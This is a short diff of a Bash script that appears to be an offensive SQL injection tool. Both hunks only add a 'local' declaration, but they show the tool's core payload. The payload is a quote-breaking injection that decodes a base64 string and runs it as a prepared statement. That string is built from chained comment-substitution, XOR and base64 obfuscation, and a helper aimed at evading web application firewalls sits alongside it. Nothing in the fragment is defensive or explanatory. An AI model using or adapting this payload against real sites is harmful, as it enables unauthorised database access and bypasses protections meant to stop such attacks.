@@ -51,7 +51,7 @@
           local t4=$(space2comment_engine "$t2")
           local hex_xor=$(xor_engine "$t4")
           local b64_payload=$(base64_engine "$hex_xor")
-                    defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
+          local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
 
           local waf_args=$(braindamage)
           local clean_target_url="${target_url%%\?*}"
@@ -171,7 +171,7 @@
             local t4=$(space2comment_engine "$t2")
             local hex_xor=$(xor_engine "$t4")
             local b64_payload=$(base64_engine "$hex_xor")
-                      defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
+                      local defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
 
           local waf_args=$(braindamage)
           local clean_target_url="${target_url%%\?*}"
